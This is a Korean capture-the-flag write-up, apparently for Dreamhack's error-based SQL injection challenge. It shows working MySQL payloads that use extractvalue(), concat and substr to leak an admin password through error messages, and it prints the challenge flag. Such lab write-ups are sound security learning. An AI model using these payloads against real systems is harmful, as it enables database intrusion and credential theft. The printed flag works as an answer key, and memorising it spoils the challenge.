---
title: "[Dreamhack] Error-Based SQL Injection 라이트업"
description: uid 파라미터의 SQLi를 찾아, 에러 메시지에 SELECT 결과를 실어 admin 비밀번호를 뽑아낸 과정입니다.
date: 2026-09-20 21:00:00 +0900
category: ctf-wargame
tags: [web, dreamhack, sql-injection, writeup]
---

에러 메시지를 출력 통로로 쓰는 문제입니다. 개념은 [SQL Injection 정리](/posts/concept-sql-injection/)에 적어 뒀습니다.

## 취약점 확인

로그인과 검색에 쓰이는 `uid` 파라미터가 쿼리문에 그대로 이어 붙는 구조였습니다. 작은따옴표를 넣었더니 500 에러와 함께 MySQL 에러 메시지가 그대로 노출됐습니다. SQLi가 가능하다는 신호입니다.

뒤에 남는 쿼리 때문에 문법 오류가 나지 않도록 주석으로 끊었습니다.

```sql
id' --
id' #
```

## 에러에 결과 싣기

`extractvalue()`에 일부러 잘못된 XPath를 주면, 그 안의 SELECT 결과가 에러 메시지에 그대로 찍힙니다.

```sql
1' and extractvalue(0x3a, concat(0x3a, (SELECT upw FROM user LIMIT 0,1)));--
```

에러 메시지는 길이 제한이 있어서 한 번에 다 안 나왔습니다. `substr()`로 구간을 잘라 반복 요청했습니다.

```sql
1' and extractvalue(0x3a, concat(0x3a, (SELECT substr(upw,20,25) FROM user LIMIT 0,1)));--
```

## 결과

`user` 테이블 admin 계정의 `upw` 값을 구간별로 이어 붙이니 플래그 형식의 문자열이 나왔습니다.

```text
DH{c3968c78840750168774ad951fc98bf788563c4d}
```

결과가 직접 안 보여도 에러 메시지가 출력 채널이 될 수 있다는 걸 체감한 문제였습니다 :)
